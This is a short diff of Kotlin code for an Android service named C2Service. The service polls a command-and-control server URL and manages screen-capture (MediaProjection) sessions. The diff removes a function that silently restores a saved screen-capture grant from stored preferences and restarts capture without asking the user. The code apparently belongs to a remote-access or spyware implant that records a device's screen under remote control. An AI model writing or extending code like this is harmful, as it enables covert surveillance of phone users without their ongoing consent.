@@ -53,8 +53,6 @@ class C2Service : Service() {
             .getString("server_url", BuildConfig.C2_URL)!!
         log("serverUrl=$serverUrl")
 
-        tryInitProjectionFromPrefs()
-
         scope.launch { registerLoop() }
         scope.launch { pollLoop() }
     }
@@ -119,21 +117,6 @@ class C2Service : Service() {
         } catch (e: Exception) {
             log("initProjection ERROR: ${e.message}")
             projection = null
-        }
-    }
-
-    private fun tryInitProjectionFromPrefs() {
-        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
-        val code = prefs.getInt("proj_code", Int.MIN_VALUE)
-        val uri = prefs.getString("proj_data", null)
-        log("tryInitProjectionFromPrefs code=$code hasUri=${uri != null}")
-        if (code == Int.MIN_VALUE || uri == null) return
-        try {
-            val data = Intent.parseUri(uri, 0)
-            startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
-            initProjectionFromIntent(code, data)
-        } catch (e: Exception) {
-            log("parseUri failed: ${e.message}")
         }
     }
 
